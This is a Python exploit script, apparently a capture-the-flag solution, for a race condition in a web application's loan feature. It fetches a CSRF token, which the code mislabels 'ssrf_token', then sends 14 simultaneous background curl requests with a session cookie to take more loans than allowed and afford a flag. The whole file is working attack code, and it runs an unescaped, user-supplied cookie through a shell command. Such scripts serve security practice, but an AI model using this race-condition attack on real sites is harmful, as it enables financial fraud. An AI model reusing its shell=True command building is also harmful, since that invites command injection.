#!/usr/bin/python3

import argparse
import requests
import subprocess
from bs4 import BeautifulSoup

def get_ssrf_token(url,headers):

    req = requests.get(url,headers=headers)
    html = req.text
    soup = BeautifulSoup(html,features='lxml')
    ssrf_token = str(soup.find(id='csrf_token')).split('value=')[1][1:-3]
    return ssrf_token


def exploit(post_req_cmd):
    
    print("Exploiting with race condition")

    for i in range(14):
        print("[{}/14] Loaning 100$".format(i+1))
        subprocess.run(post_req_cmd,shell=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
    
    print("Done. Check your balance and buy yourself a nice flag")


def main():
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip',required=True,help='IP Address of the vulnerable website')
    parser.add_argument('--port',required=True,help='Port of the vulnerable website')
    parser.add_argument('--cookie',required=True,help='Cookie of the session. Intercept it with burp')

    args = parser.parse_args()

    url = 'http://' + args.ip + ':' + args.port
    headers = {'Cookie':args.cookie}

    ssrf_token = get_ssrf_token(url,headers)

    post_req_cmd = 'curl -s {url} -H "Cookie: {cookie}" --data "csrf_token={ssrf_token}&loan=100" &'.format(url=url,cookie=args.cookie,ssrf_token=ssrf_token)
    exploit(post_req_cmd)
    


if __name__ == '__main__':
    main()
